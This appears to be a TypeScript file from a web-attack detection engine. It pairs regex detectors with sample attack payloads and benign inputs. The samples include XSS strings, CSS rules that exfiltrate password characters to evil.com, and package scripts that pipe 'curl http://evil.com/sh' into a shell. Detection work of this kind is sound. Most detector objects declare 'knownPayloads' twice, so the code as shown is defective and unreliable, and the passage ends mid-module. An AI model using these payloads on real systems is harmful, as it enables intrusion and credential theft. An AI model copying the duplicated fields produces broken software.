import type { InvariantClassModule, DetectionLevelResult } from '../types.js'
import { deepDecode } from '../encoding.js'
import { safeRegexMatch, safeRegexTest } from './regex-safety.js'

function l2FromPattern(input: string, pattern: RegExp, explanation: string, confidence = 0.88): DetectionLevelResult | null {
    const decoded = deepDecode(input)
    const match = safeRegexMatch(pattern, decoded)
    if (!match) return null
    return {
        detected: true,
        confidence,
        explanation,
        evidence: match[0].slice(0, 160),
    }
}

function regexDetectionHandlers(pattern: RegExp, explanation: string): Pick<InvariantClassModule, 'detect' | 'detectL2'> {
    return {
        detect: (input: string) => safeRegexTest(pattern, deepDecode(input)),
        detectL2: (input: string) => l2FromPattern(input, pattern, explanation),
    }
}

// 1. XSS mXSS Mutations
const MXSS_MUTATION_RE = /<(?:math|svg)[^>]*><(?:mtext|desc|title|foreignObject)[^>]*><(?:math|svg)[^>]*>[\s\S]*?<(?:xmp|style|iframe|noembed|noframes|plaintext|noscript)[^>]*>/i
export const xssMxssMutation: InvariantClassModule = {
    id: 'xss_mxss_mutation',
    description: 'Mutation XSS (mXSS) utilizing nested namespace shifts (math/svg) to bypass sanitization',
    category: 'xss',
    severity: 'high',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1189'],
    cwe: 'CWE-79',
    knownPayloads: [
        '<math><mtext><math><xmp><script>alert(1)</script></xmp></math></mtext></math>',
        '<math><mtext><svg><foreignObject><math><xmp><script>alert(1)</script></xmp></math></foreignObject></svg></mtext></math>',
        '<math><mtext><math><style>@import\"javascript:alert(1)\"</style><script>alert(1)</script><xmp><script>alert(1)</script></xmp></math></mtext></math>',
    ],
    knownBenign: ['<math><mtext>1+1=2</mtext></math>', '<math><mtext>hello</mtext></math>', '<div>safe math</div>'],
    ...regexDetectionHandlers(MXSS_MUTATION_RE, 'L2 DOM analysis found mXSS nested namespace confusion pattern'),
    generateVariants: (count) => ['<math><mtext><math><xmp><script>alert(1)</script></xmp></math></mtext></math>'].slice(0, count)
}

// 2. XSS DOM Clobbering
const DOM_CLOBBERING_RE = /(?:id|name)\s*=\s*['"]?(?:alert|prompt|confirm|eval|window|document|setTimeout|setInterval|location|cookie|fetch|XMLHttpRequest|self|parent|top|frames|length|name)['"]?/i
export const xssDomClobbering: InvariantClassModule = {
    id: 'xss_dom_clobbering',
    description: 'DOM Clobbering via named form elements overriding global window/document properties',
    category: 'xss',
    severity: 'medium',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1189'],
    cwe: 'CWE-79',
    knownPayloads: [
        '<form id="document"></form>',
        '<img name="location" src="x">',
        '<form><input id="location" name="document"></form>',
    ],
    knownBenign: ['<div id="content"></div>', '<form><input name="user"></form>', '<div class="layout"></div>'],
    ...regexDetectionHandlers(DOM_CLOBBERING_RE, 'L2 DOM analysis found global variable clobbering via id/name attribute'),
    generateVariants: (count) => ['<form id="document"></form>', '<img name="location" src="x">'].slice(0, count)
}

// 3. SVG SMIL Animation XSS
const SVG_SMIL_RE = /<animate[^>]*attributeName\s*=\s*['"]?(?:href|xlink:href|on\w+)['"]?/i
export const xssSvgSmil: InvariantClassModule = {
    id: 'xss_svg_smil',
    description: 'XSS via SVG SMIL animation manipulating href or event attributes',
    category: 'xss',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1189'],
    cwe: 'CWE-79',
    knownPayloads: [
        '<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>',
        '<svg><animate attributeName="xlink:href" values="javascript:alert(2)"></animate></svg>',
        '<svg><animate attributeName="onload" values="alert(3)"></animate></svg>',
    ],
    knownBenign: ['<svg><animate attributeName="opacity" values="0;1"></animate></svg>', '<svg><title>icon</title></svg>', '<svg><text>safe</text></svg>'],
    ...regexDetectionHandlers(SVG_SMIL_RE, 'L2 DOM analysis found SMIL animation targeting sensitive attributes'),
    generateVariants: (count) => ['<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>'].slice(0, count)
}

// 4. CSS Injection Keylogger
const CSS_KEYLOGGER_RE = /input\[type=['"]?password['"]?\]\[value\^=['"]?[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\|,.<>\/?]['"]?\]\s*{\s*background(?:-image)?\s*:\s*url\s*\(/i
export const xssCssKeylogger: InvariantClassModule = {
    id: 'xss_css_keylogger',
    description: 'CSS Injection acting as a keylogger by matching password value prefixes',
    category: 'xss',
    severity: 'high',
    calibration: { baseConfidence: 0.95 },
    mitre: ['T1056'],
    cwe: 'CWE-79',
    knownPayloads: [
        'input[type="password"][value^="a"] { background-image: url("http://evil.com/a"); }',
        'input[type="password"][value^="k"] { background-image: url("https://attacker.net/k"); }',
        'input[type="password"][value^="x"] { background-image: url("/track.png"); }',
    ],
    knownBenign: ['input[type="password"] { background-color: red; }', 'input[type="text"] { color: #333; }', 'body { margin: 0; }'],
    ...regexDetectionHandlers(CSS_KEYLOGGER_RE, 'L2 CSS parsing matched attribute-selector exfiltration (CSS keylogger)'),
    generateVariants: (count) => ['input[type="password"][value^="a"] { background-image: url("http://evil.com/a"); }'].slice(0, count)
}

// 5. OAuth Auth Code Interception
const OAUTH_AUTH_CODE_RE = /(?:code|authorization_code)=[a-zA-Z0-9_\-]{16,}&state=[a-zA-Z0-9_\-]{8,}/i
export const oauthAuthCodeInterception: InvariantClassModule = {
    id: 'oauth_auth_code_interception',
    description: 'OAuth authorization code intercepted in logs or unencrypted channels',
    category: 'auth',
    severity: 'high',
    calibration: { baseConfidence: 0.7 },
    mitre: ['T1550'],
    cwe: 'CWE-294',
    knownPayloads: ['?code=spl4tspl4tspl4tspl4t&state=xyz123xyz', 'authorization_code=abcdefghijklmnop&state=def12345'],
    knownPayloads: ['?code=spl4tspl4tspl4tspl4t&state=xyz123xyz', 'authorization_code=abcdefghijklmnop&state=def12345', 'code=abcdefghijklmno1234&state=abcd5678'],
    knownBenign: ['code=200&state=success', 'code=200&error=invalid_request', 'authorization=granted'],
    ...regexDetectionHandlers(OAUTH_AUTH_CODE_RE, 'L2 URL analysis matched OAuth authorization code grant parameters in potentially insecure context'),
    generateVariants: (count) => ['?code=spl4tspl4tspl4tspl4t&state=xyz123xyz'].slice(0, count)
}

// 6. OAuth Token Endpoint CSRF
const OAUTH_TOKEN_CSRF_RE = /grant_type=authorization_code/i
const CODE_VERIFIER_RE = /code_verifier/i
const CLIENT_SECRET_RE = /client_secret/i
export const oauthTokenEndpointCsrf: InvariantClassModule = {
    id: 'oauth_token_endpoint_csrf',
    description: 'OAuth token endpoint vulnerable to CSRF or missing PKCE/state verification',
    category: 'auth',
    severity: 'high',
    calibration: { baseConfidence: 0.75 },
    mitre: ['T1189'],
    cwe: 'CWE-352',
    knownPayloads: ['grant_type=authorization_code&code=123'],
    knownPayloads: ['grant_type=authorization_code&code=123', 'grant_type=authorization_code&code=abcd1234&redirect_uri=%2Fcallback', 'code=abc123&grant_type=authorization_code&state=xyz'],
    knownBenign: ['grant_type=client_credentials', 'code_verifier=abc&grant_type=authorization_code', 'client_secret=secret&grant_type=authorization_code'],
    detect: (input) => {
        const d = deepDecode(input)
        return safeRegexTest(OAUTH_TOKEN_CSRF_RE, d)
            && !safeRegexTest(CODE_VERIFIER_RE, d)
            && !safeRegexTest(CLIENT_SECRET_RE, d)
    },
    detectL2: (input) => l2FromPattern(input, OAUTH_TOKEN_CSRF_RE, 'L2 auth analysis found authorization_code grant missing PKCE/client authentication'),
    generateVariants: (count) => ['grant_type=authorization_code&code=123'].slice(0, count)
}

// 7. OAuth Redirect URI Traversal
const OAUTH_REDIRECT_TRAVERSAL_RE = /redirect_uri=https?:\/\/[^\s&]+(?:\.\.|%2e%2e|\.%2e|%2e\.)(?:[^\s&]*)/i
export const oauthRedirectUriTraversal: InvariantClassModule = {
    id: 'oauth_redirect_uri_traversal',
    description: 'OAuth redirect_uri parameter containing path traversal characters to bypass validation',
    category: 'auth',
    severity: 'high',
    calibration: { baseConfidence: 0.88 },
    mitre: ['T1550.001'],
    cwe: 'CWE-601',
    knownPayloads: ['redirect_uri=https://trusted.com/auth/../evil'],
    knownPayloads: ['redirect_uri=https://trusted.com/auth/../evil', 'redirect_uri=https://trusted.com/oauth/%2e%2e/evil', 'redirect_uri=https://trusted.com/auth/../../reset'],
    knownBenign: ['redirect_uri=https://trusted.com/auth/callback', 'redirect_uri=/auth/callback', 'return_to=/dashboard'],
    ...regexDetectionHandlers(OAUTH_REDIRECT_TRAVERSAL_RE, 'L2 auth analysis found path traversal inside OAuth redirect_uri'),
    generateVariants: (count) => ['redirect_uri=https://trusted.com/auth/../evil'].slice(0, count)
}

// 8. OAuth Device Code Phishing
const OAUTH_DEVICE_CODE_RE = /device_code=[a-zA-Z0-9_\-]+&user_code=[a-zA-Z0-9_\-]+/i
export const oauthDeviceCodePhishing: InvariantClassModule = {
    id: 'oauth_device_code_phishing',
    description: 'OAuth device authorization grant codes exposed, indicating potential phishing',
    category: 'auth',
    severity: 'high',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1566'],
    cwe: 'CWE-294',
    knownPayloads: ['device_code=xyz&user_code=ABCD-1234'],
    knownPayloads: ['device_code=xyz&user_code=ABCD-1234', 'device_code=ab12cd34&user_code=ZXCV-8901', 'device_code=phish-001&user_code=LOGIN-9999'],
    knownBenign: ['device_code=xyz', 'device_code_status=invalid', 'user_code_hint=ABCD-EFGH'],
    ...regexDetectionHandlers(OAUTH_DEVICE_CODE_RE, 'L2 auth analysis found OAuth device code pairs suitable for phishing'),
    generateVariants: (count) => ['device_code=xyz&user_code=ABCD-1234'].slice(0, count)
}

// 9. SSRF AWS IMDS TTL Bypass
const AWS_IMDS_TTL_RE = /X-aws-ec2-metadata-token-ttl-seconds\s*:\s*(?:1|2|3|4|5)\b/i
export const ssrfAwsImdsTtlBypass: InvariantClassModule = {
    id: 'ssrf_aws_imds_ttl_bypass',
    description: 'AWS IMDSv2 requested with abnormally low TTL, indicating SSRF token extraction',
    category: 'ssrf',
    severity: 'critical',
    calibration: { baseConfidence: 0.95 },
    mitre: ['T1552.005'],
    cwe: 'CWE-918',
    knownPayloads: ['X-aws-ec2-metadata-token-ttl-seconds: 1'],
    knownPayloads: ['X-aws-ec2-metadata-token-ttl-seconds: 1', 'X-aws-ec2-metadata-token-ttl-seconds: 2', 'X-aws-ec2-metadata-token-ttl-seconds: 5'],
    knownBenign: ['X-aws-ec2-metadata-token-ttl-seconds: 21600', 'User-Agent: aws-cli/2.2.32', 'X-Request-Id: 1234'],
    ...regexDetectionHandlers(AWS_IMDS_TTL_RE, 'L2 SSRF analysis matched IMDSv2 token request with minimal TTL (exploit indicator)'),
    generateVariants: (count) => ['X-aws-ec2-metadata-token-ttl-seconds: 1'].slice(0, count)
}

// 10. SSRF GCP Metadata
const GCP_METADATA_RE = /Metadata-Flavor\s*:\s*Google/i
export const ssrfGcpMetadata: InvariantClassModule = {
    id: 'ssrf_gcp_metadata',
    description: 'GCP metadata header used in requests, indicating SSRF targeting GCP internal API',
    category: 'ssrf',
    severity: 'critical',
    calibration: { baseConfidence: 0.95 },
    mitre: ['T1552.005'],
    cwe: 'CWE-918',
    knownPayloads: ['Metadata-Flavor: Google'],
    knownPayloads: ['Metadata-Flavor: Google', 'metadata-flavor: google', 'Metadata-Flavor: GOOGLE'],
    knownBenign: ['Metadata-Flavor: None', 'Accept: application/json', 'X-Cloud-Project: demo'],
    ...regexDetectionHandlers(GCP_METADATA_RE, 'L2 SSRF analysis matched GCP metadata access header'),
    generateVariants: (count) => ['Metadata-Flavor: Google'].slice(0, count)
}

// 11. SSRF Azure IMDS
const AZURE_IMDS_RE = /Metadata\s*:\s*true/i
const FORMAT_JSON_RE = /format=json/i
export const ssrfAzureImds: InvariantClassModule = {
    id: 'ssrf_azure_imds',
    description: 'Azure IMDS metadata header used in requests, indicating SSRF targeting Azure internal API',
    category: 'ssrf',
    severity: 'critical',
    calibration: { baseConfidence: 0.95 },
    mitre: ['T1552.005'],
    cwe: 'CWE-918',
    knownPayloads: ['Metadata: true\\r\\nformat=json'],
    knownPayloads: ['Metadata: true\\r\\nformat=json', 'metadata: true\\r\\nformat=JSON', 'Metadata: true\\r\\nformat=json\\r\\n'],
    knownBenign: ['Metadata: false', 'Metadata: false\\r\\nformat=json', 'Connection: keep-alive'],
    detect: (input) => {
        const d = deepDecode(input)
        return safeRegexTest(AZURE_IMDS_RE, d) && safeRegexTest(FORMAT_JSON_RE, d)
    },
    detectL2: (input) => l2FromPattern(input, AZURE_IMDS_RE, 'L2 SSRF analysis matched Azure IMDS metadata access pattern'),
    generateVariants: (count) => ['Metadata: true\\r\\nformat=json'].slice(0, count)
}

// 12. SSRF DNS Rebinding
const DNS_REBINDING_RE = /Host\s*:\s*(?:localhost|127\.0\.0\.1|169\.254\.169\.254)\b/i
export const ssrfDnsRebinding: InvariantClassModule = {
    id: 'ssrf_dns_rebinding',
    description: 'Host header indicating internal IPs, typically associated with DNS rebinding or direct SSRF',
    category: 'ssrf',
    severity: 'high',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1190'],
    cwe: 'CWE-918',
    knownPayloads: ['Host: 169.254.169.254'],
    knownPayloads: ['Host: 169.254.169.254', 'Host: 127.0.0.1', 'Host: localhost:8080'],
    knownBenign: ['Host: example.com', 'Host: 203.0.113.5', 'Host: safe.example.org'],
    ...regexDetectionHandlers(DNS_REBINDING_RE, 'L2 SSRF analysis matched Host header targeting loopback/cloud metadata IPs'),
    generateVariants: (count) => ['Host: 169.254.169.254'].slice(0, count)
}

// 13. HTTP/2 Rapid Reset
const HTTP2_RAPID_RESET_RE = /RST_STREAM.*(?:CANCEL|NO_ERROR)/i
export const http2RapidReset: InvariantClassModule = {
    id: 'http2_rapid_reset',
    description: 'HTTP/2 Rapid Reset (CVE-2023-44487) DDoS pattern using immediate stream cancellation',
    category: 'smuggling',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1499'],
    cwe: 'CWE-400',
    knownPayloads: ['HEADERS stream=1\\r\\nRST_STREAM stream=1 CANCEL'],
    knownPayloads: ['HEADERS stream=1\\r\\nRST_STREAM stream=1 CANCEL', 'RST_STREAM stream=3 NO_ERROR', 'HEADERS stream=5\\r\\nRST_STREAM stream=5 CANCEL'],
    knownBenign: ['HEADERS stream=1\\r\\nDATA stream=1', 'HEADERS stream=1\\r\\n:method: GET', 'DATA stream=1\\r\\nHello'],
    ...regexDetectionHandlers(HTTP2_RAPID_RESET_RE, 'L2 HTTP/2 analysis matched rapid stream reset DDoS signature'),
    generateVariants: (count) => ['HEADERS stream=1\\r\\nRST_STREAM stream=1 CANCEL'].slice(0, count)
}

// 14. HTTP/2 HPACK Bomb
const HTTP2_HPACK_BOMB_RE = /SETTINGS_HEADER_TABLE_SIZE\s*=\s*[0-9]{5,}/i
export const http2HpackBomb: InvariantClassModule = {
    id: 'http2_hpack_bomb',
    description: 'HTTP/2 HPACK Bomb DDoS pattern via massive header table size updates',
    category: 'smuggling',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1499'],
    cwe: 'CWE-400',
    knownPayloads: ['SETTINGS_HEADER_TABLE_SIZE=4294967295'],
    knownPayloads: ['SETTINGS_HEADER_TABLE_SIZE=4294967295', 'SETTINGS_HEADER_TABLE_SIZE=99999', 'SETTINGS_HEADER_TABLE_SIZE=1000000'],
    knownBenign: ['SETTINGS_HEADER_TABLE_SIZE=4096', 'SETTINGS_MAX_CONCURRENT_STREAMS=100', 'SETTINGS_ENABLE_PUSH=0'],
    ...regexDetectionHandlers(HTTP2_HPACK_BOMB_RE, 'L2 HTTP/2 analysis matched abnormal HPACK dynamic table size inflation'),
    generateVariants: (count) => ['SETTINGS_HEADER_TABLE_SIZE=4294967295'].slice(0, count)
}

// 15. Crypto Weak Cipher
const CRYPTO_WEAK_CIPHER_RE = /Cipher-Suite\s*:\s*.*(?:RC4|NULL|DES|MD5)(?:_|[^A-Z0-9_]|$)/i
export const cryptoWeakCipher: InvariantClassModule = {
    id: 'crypto_weak_cipher',
    description: 'Weak cryptographic cipher requested in headers (e.g. RC4, NULL)',
    category: 'auth',
    severity: 'medium',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1557'],
    cwe: 'CWE-327',
    knownPayloads: ['Cipher-Suite: TLS_RSA_WITH_RC4_128_MD5'],
    knownPayloads: ['Cipher-Suite: TLS_RSA_WITH_RC4_128_MD5', 'Cipher-Suite: TLS_DHE_DSS_WITH_DES_CBC_SHA', 'Cipher-Suite: TLS_RSA_WITH_NULL_SHA'],
    knownBenign: ['Cipher-Suite: TLS_AES_128_GCM_SHA256', 'Cipher-Suite: TLS_CHACHA20_POLY1305_SHA256', 'TLSv1.3'],
    ...regexDetectionHandlers(CRYPTO_WEAK_CIPHER_RE, 'L2 Crypto analysis matched deprecated/weak cipher suite usage'),
    generateVariants: (count) => ['Cipher-Suite: TLS_RSA_WITH_RC4_128_MD5'].slice(0, count)
}

// 16. Crypto BEAST/POODLE
const CRYPTO_BEAST_POODLE_RE = /SSLv3|TLSv1\.0|SSLv2/i
export const cryptoBeastPoodle: InvariantClassModule = {
    id: 'crypto_beast_poodle',
    description: 'Legacy SSL/TLS versions vulnerable to BEAST/POODLE attacks',
    category: 'auth',
    severity: 'high',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1557'],
    cwe: 'CWE-327',
    knownPayloads: ['Protocol: SSLv3'],
    knownPayloads: ['Protocol: SSLv3', 'Protocol: TLSv1.0', 'Protocol: SSLv2'],
    knownBenign: ['Protocol: TLSv1.3', 'Protocol: TLSv1.2', 'Protocol: HTTPS'],
    ...regexDetectionHandlers(CRYPTO_BEAST_POODLE_RE, 'L2 Crypto analysis matched legacy protocol negotiation (SSLv3/TLSv1.0)'),
    generateVariants: (count) => ['Protocol: SSLv3'].slice(0, count)
}

// 17. JWT RS256->HS256 Confusion
const JWT_RS256_HS256_RE = /"alg"\s*:\s*"HS256"/i
const KID_PEM_RE = /"kid"\s*:\s*".*\.pem"/i
export const jwtRs256Hs256Confusion: InvariantClassModule = {
    id: 'jwt_rs256_hs256_confusion',
    description: 'JWT algorithm confusion (RS256 to HS256) attempting to use public key as HMAC secret',
    category: 'auth',
    severity: 'critical',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1550.001'],
    cwe: 'CWE-347',
    knownPayloads: ['{"alg":"HS256","typ":"JWT","kid":"public_key.pem"}'],
    knownPayloads: ['{"alg":"HS256","typ":"JWT","kid":"public_key.pem"}', '{"alg":"HS256","kid":"../../keys/public_key.pem","typ":"JWT"}', '{"alg":"HS256","typ":"JWT","x5c":"MII...","kid":"public_key.pem"}'],
    knownBenign: ['{"alg":"HS256","typ":"JWT"}', '{"alg":"RS256","typ":"JWT","kid":"server-key"}', '{"alg":"none","typ":"JWT"}'],
    detect: (input) => {
        const d = deepDecode(input)
        return safeRegexTest(JWT_RS256_HS256_RE, d) && safeRegexTest(KID_PEM_RE, d)
    },
    detectL2: (input) => {
        const d = deepDecode(input)
        if (safeRegexTest(JWT_RS256_HS256_RE, d) && safeRegexTest(KID_PEM_RE, d)) {
            return {
                detected: true,
                confidence: 0.9,
                explanation: 'L2 Auth analysis matched JWT algorithm confusion (HS256 with asymmetric kid)',
            }
        }
        return null
    },
    generateVariants: (count) => ['{"alg":"HS256","typ":"JWT","kid":"public_key.pem"}'].slice(0, count)
}

// 18. GraphQL Depth Bomb
const GQL_DEPTH_RE = /(?:{[^{}]*){10,}/
export const graphqlDepthBomb: InvariantClassModule = {
    id: 'graphql_depth_bomb',
    description: 'GraphQL recursive query depth DoS',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1499'],
    cwe: 'CWE-400',
    knownPayloads: ['{a{b{c{d{e{f{g{h{i{j{k{l{m}}}}}}}}}}}}}'],
    knownPayloads: ['{a{b{c{d{e{f{g{h{i{j{k{l{m}}}}}}}}}}}}}', '{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p}}}}}}}}}}}}}}', '{query{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r}}}}}}}}}}}}}}}}}'],
    knownBenign: ['{user{id,name}}', '{query { user { id name } } }', '{profile { id } }'],
    ...regexDetectionHandlers(GQL_DEPTH_RE, 'L2 GraphQL parsing matched excessive nested query depth'),
    generateVariants: (count) => ['{a{b{c{d{e{f{g{h{i{j{k{l{m}}}}}}}}}}}}}'].slice(0, count)
}

// 19. GraphQL Alias Bomb
const GQL_ALIAS_RE = /(?:\b\w+\s*:\s*\w+\s*(?:\([^)]*\))?\s*){50,}/
export const graphqlAliasBomb: InvariantClassModule = {
    id: 'graphql_alias_bomb',
    description: 'GraphQL alias bomb DoS via excessive aliasing of the same field',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1499'],
    cwe: 'CWE-400',
    knownPayloads: ['{a1:x a2:x a3:x a4:x a5:x a6:x a7:x a8:x a9:x a10:x a11:x a12:x a13:x a14:x a15:x a16:x a17:x a18:x a19:x a20:x a21:x a22:x a23:x a24:x a25:x a26:x a27:x a28:x a29:x a30:x a31:x a32:x a33:x a34:x a35:x a36:x a37:x a38:x a39:x a40:x a41:x a42:x a43:x a44:x a45:x a46:x a47:x a48:x a49:x a50:x a51:x}'],
    knownPayloads: ['{a1:x a2:x a3:x a4:x a5:x a6:x a7:x a8:x a9:x a10:x a11:x a12:x a13:x a14:x a15:x a16:x a17:x a18:x a19:x a20:x a21:x a22:x a23:x a24:x a25:x a26:x a27:x a28:x a29:x a30:x a31:x a32:x a33:x a34:x a35:x a36:x a37:x a38:x a39:x a40:x a41:x a42:x a43:x a44:x a45:x a46:x a47:x a48:x a49:x a50:x a51:x}', '{a1:x a2:x a3:x a4:x a5:x a6:x a7:x a8:x a9:x a10:x a11:x a12:x a13:x a14:x a15:x a16:x a17:x a18:x a19:x a20:x a21:x a22:x a23:x a24:x a25:x a26:x a27:x a28:x a29:x a30:x a31:x a32:x a33:x a34:x a35:x a36:x a37:x a38:x a39:x a40:x a41:x a42:x a43:x a44:x a45:x a46:x a47:x a48:x a49:x a50:x a51:x}', '{p1:y p2:y p3:y p4:y p5:y p6:y p7:y p8:y p9:y p10:y p11:y p12:y p13:y p14:y p15:y p16:y p17:y p18:y p19:y p20:y p21:y p22:y p23:y p24:y p25:y p26:y p27:y p28:y p29:y p30:y p31:y p32:y p33:y p34:y p35:y p36:y p37:y p38:y p39:y p40:y p41:y p42:y p43:y p44:y p45:y p46:y p47:y p48:y p49:y p50:y}'],
    knownBenign: ['{a:name b:email}', '{query {user{id}}}', '{mutation {update(input:{id:1})}}'],
    ...regexDetectionHandlers(GQL_ALIAS_RE, 'L2 GraphQL parsing matched excessive field aliasing'),
    generateVariants: (count) => ['{a1:x a2:x a3:x a4:x a5:x a6:x a7:x a8:x a9:x a10:x a11:x a12:x a13:x a14:x a15:x a16:x a17:x a18:x a19:x a20:x a21:x a22:x a23:x a24:x a25:x a26:x a27:x a28:x a29:x a30:x a31:x a32:x a33:x a34:x a35:x a36:x a37:x a38:x a39:x a40:x a41:x a42:x a43:x a44:x a45:x a46:x a47:x a48:x a49:x a50:x a51:x}'].slice(0, count)
}

// 20. GraphQL Fragment Bomb
const GQL_FRAGMENT_RE = /(?:\.\.\.\w+\s*){50,}/
export const graphqlFragmentBomb: InvariantClassModule = {
    id: 'graphql_fragment_bomb',
    description: 'GraphQL fragment bomb DoS via cyclic or excessive fragment spreads',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1499'],
    cwe: 'CWE-400',
    knownPayloads: ['{ ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f }'],
    knownPayloads: ['{ ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f }', '{ ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A ...A }', '{ ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x ...x }'],
    knownBenign: ['{ ...userDetails }', '{ user { id } }', '{ data { user { name } } }'],
    ...regexDetectionHandlers(GQL_FRAGMENT_RE, 'L2 GraphQL parsing matched excessive fragment spreading'),
    generateVariants: (count) => ['{ ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f ...f }'].slice(0, count)
}

// 21. Supply Chain GitHub Actions
const GITHUB_ACTIONS_RE = /\${{\s*github\.(?:event\.issue\.title|head_ref|actor)\s*}}/i
export const supplyChainGithubActions: InvariantClassModule = {
    id: 'supply_chain_github_actions',
    description: 'GitHub Actions injection via untrusted workflow variables',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1059'],
    cwe: 'CWE-94',
    knownPayloads: ['echo "${{ github.event.issue.title }}"'],
    knownPayloads: ['echo "${{ github.event.issue.title }}"', 'echo "${{ github.head_ref }}"', 'echo "${{ github.actor }} requested $(date) "'],
    knownBenign: ['echo "${{ github.sha }}"', 'echo "${{ github.workflow }}"', 'echo "build safe"'],
    ...regexDetectionHandlers(GITHUB_ACTIONS_RE, 'L2 Supply Chain analysis matched risky GitHub Actions context interpolation'),
    generateVariants: (count) => ['echo "${{ github.event.issue.title }}"'].slice(0, count)
}

// 22. Supply Chain Package Eval
const PACKAGE_EVAL_RE = /"scripts"\s*:\s*{[^}]*(?:eval|node\s+-e|curl\s+[^|]+\||wget\s+[^|]+\|)/i
export const supplyChainPackageEval: InvariantClassModule = {
    id: 'supply_chain_package_eval',
    description: 'Arbitrary code execution or download-and-execute chains in package.json scripts',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1195'],
    cwe: 'CWE-94',
    knownPayloads: ['"scripts": { "postinstall": "curl http://evil.com/sh | sh" }'],
    knownPayloads: ['"scripts": { "postinstall": "curl http://evil.com/sh | sh" }', '"scripts": { "postinstall": "node -e \\"require(`http`).createServer(()=>{})\\""}', '"scripts": { "prepare": "curl https://evil.com/payload | bash" }'],
    knownBenign: ['"scripts": { "test": "jest" }', '"scripts": { "build": "npm run build" }', '"scripts": { "lint": "eslint ." }'],
    ...regexDetectionHandlers(PACKAGE_EVAL_RE, 'L2 Supply Chain analysis matched remote script execution in package manifest'),
    generateVariants: (count) => ['"scripts": { "postinstall": "curl http://evil.com/sh | sh" }'].slice(0, count)
}

// 23. Memory Actuator Heapdump
const ACTUATOR_HEAP_RE = /\/actuator\/(?:heapdump|env|metrics)/i
export const memoryActuatorHeapdump: InvariantClassModule = {
    id: 'memory_actuator_heapdump',
    description: 'Spring Boot Actuator heapdump or env endpoint exposure',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1005'],
    cwe: 'CWE-200',
    knownPayloads: ['GET /actuator/heapdump HTTP/1.1'],
    knownPayloads: ['GET /actuator/heapdump HTTP/1.1', 'GET /actuator/env HTTP/1.1', 'GET /actuator/metrics HTTP/1.1'],
    knownBenign: ['GET /actuator/health HTTP/1.1', 'GET /actuator/info HTTP/1.1', 'GET /actuator/beans HTTP/1.1'],
    ...regexDetectionHandlers(ACTUATOR_HEAP_RE, 'L2 Hygiene analysis matched sensitive Spring Boot Actuator endpoint'),
    generateVariants: (count) => ['GET /actuator/heapdump HTTP/1.1'].slice(0, count)
}

// 24. Memory pprof Exposure
const PPROF_EXPOSURE_RE = /\/debug\/pprof\/(?:heap|profile|goroutine)/i
export const memoryPprofExposure: InvariantClassModule = {
    id: 'memory_pprof_exposure',
    description: 'Go pprof debug endpoint exposure leaking memory/CPU profiles',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1005'],
    cwe: 'CWE-200',
    knownPayloads: ['GET /debug/pprof/heap HTTP/1.1'],
    knownPayloads: ['GET /debug/pprof/heap HTTP/1.1', 'GET /debug/pprof/profile HTTP/1.1', 'GET /debug/pprof/goroutine HTTP/1.1'],
    knownBenign: ['GET /debug/health HTTP/1.1', 'GET /status HTTP/1.1', 'GET /metrics HTTP/1.1'],
    ...regexDetectionHandlers(PPROF_EXPOSURE_RE, 'L2 Hygiene analysis matched exposed Go pprof debug endpoint'),
    generateVariants: (count) => ['GET /debug/pprof/heap HTTP/1.1'].slice(0, count)
}

// 25. Memory PHPInfo Output
const PHPINFO_RE = /<title>phpinfo\(\)<\/title>|<h1(?:\s+class=\"p\")?>PHP Version<\/h1>/i
export const memoryPhpinfoOutput: InvariantClassModule = {
    id: 'memory_phpinfo_output',
    description: 'phpinfo() output leaking server configuration and environment variables',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.95 },
    mitre: ['T1592'],
